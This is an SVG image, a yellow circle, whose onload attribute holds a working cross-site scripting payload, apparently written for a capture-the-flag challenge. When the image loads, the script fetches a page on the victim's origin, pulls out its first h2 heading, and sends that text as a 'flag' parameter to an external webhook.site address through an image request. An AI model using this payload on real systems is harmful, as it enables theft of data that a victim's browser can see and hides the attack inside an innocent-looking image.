<svg xmlns="http://www.w3.org/2000/svg" onload="
  fetch('/videos?filter=a')
    .then(r => r.text())
    .then(html => {
      const m = html.match(/<h2>(.*?)<\/h2>/);
      if (m && m[1]) {
        new Image().src = 'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=' + encodeURIComponent(m[1]);
      }
    });
">
  <circle cx='50' cy='50' r='40' stroke='red' stroke-width='4' fill='yellow'/>
</svg>
